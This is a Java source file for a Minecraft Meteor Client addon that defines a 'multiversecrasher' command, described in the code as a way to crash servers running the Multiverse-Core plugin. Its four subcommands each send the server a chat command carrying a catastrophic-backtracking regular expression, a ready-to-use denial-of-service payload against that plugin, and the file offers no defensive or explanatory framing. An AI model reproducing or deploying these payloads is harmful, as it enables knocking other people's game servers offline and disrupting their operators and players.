package de.frxstdev.crashaddon.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import meteordevelopment.meteorclient.commands.Command;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import net.minecraft.command.CommandSource;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtDouble;
import net.minecraft.nbt.NbtList;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

public class MultiverseCrasherCommand extends Command {
    public MultiverseCrasherCommand() {
        super("multiversecrasher", "Crash Server's with Multiverse-Core!", "mvcrash", "multicrash");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(literal("old").executes(ctx -> {
            ChatUtils.sendPlayerMsg("//MultiVerseCore:mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
            return SINGLE_SUCCESS;
        }));

        builder.then(literal("old2").executes(ctx -> {
            ChatUtils.sendPlayerMsg("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
            return SINGLE_SUCCESS;
        }));

        builder.then(literal("old3").executes(ctx -> {
            ChatUtils.sendPlayerMsg("/mVhElP <*.*.*.*.*.*.*.>");
            return SINGLE_SUCCESS;
        }));

        builder.then(literal("new").executes(ctx -> {
            ChatUtils.sendPlayerMsg("/mvh .*{9999}.*{9999}.*{9999}.*{9999}.$%");
            return SINGLE_SUCCESS;
        }));
    }
}
